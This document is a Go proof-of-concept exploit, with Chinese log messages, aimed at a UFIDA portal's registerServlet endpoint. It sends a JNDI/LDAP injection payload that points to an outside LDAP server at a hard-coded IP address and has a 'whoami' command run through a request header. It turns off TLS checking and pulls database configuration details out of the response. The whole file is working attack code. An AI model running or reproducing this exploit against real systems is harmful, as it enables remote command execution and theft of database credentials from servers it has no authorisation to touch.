package poc

import (
	"bytes"
	"crypto/tls"
	"io"
	"log"
	"net/http"
	"regexp"
	"strings"
)

func UFIDA_registerServlet(target string) {
	url := strings.TrimRight(target, "/")
	data := "type=1&dsname=ldap://172.245.159.55:1389/TomcatBypass/TomcatEcho"
	req, _ := http.NewRequest("POST", url+"/portal/registerServlet", bytes.NewBufferString(data))
	req.Header.Set("cmd", "whoami")

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	resp, err := client.Do(req)
	if err != nil {
		log.Println("请求发送失败:", err)
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Println("获取请求失败：", err)
	}
	msg := regexp.MustCompile("<return>jdbc:").MatchString(string(body))
	if resp.StatusCode == http.StatusOK && msg {
		regex := regexp.MustCompile(`<return>(.*?)</return>`)
		matches := regex.FindAllStringSubmatch(string(body), -1)
		for i, match := range matches {
			if i >= 1 {
				log.Println("[+] 数据库配置信息:", match[1])
			}
		}
	} else {
		log.Println("[-] 不存在UFIDA数据库信息泄露漏洞")
	}
}
